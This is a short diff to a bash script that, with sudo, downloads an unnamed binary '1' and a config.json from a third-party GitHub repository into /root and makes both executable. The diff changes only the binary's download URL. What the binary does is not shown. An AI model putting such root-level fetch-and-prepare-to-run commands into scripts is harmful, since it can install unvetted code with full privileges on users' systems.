@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo curl -o /root/1 https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/1
+sudo curl -o /root/1 https://github.com/Shallow-Sea/tools/raw/main/1
 sudo curl -o /root/config.json https://raw.githubusercontent.com/Shallow-Sea/tools/raw/main/config.json
 sudo chmod +x /root/1
 sudo chmod +x /root/config.json
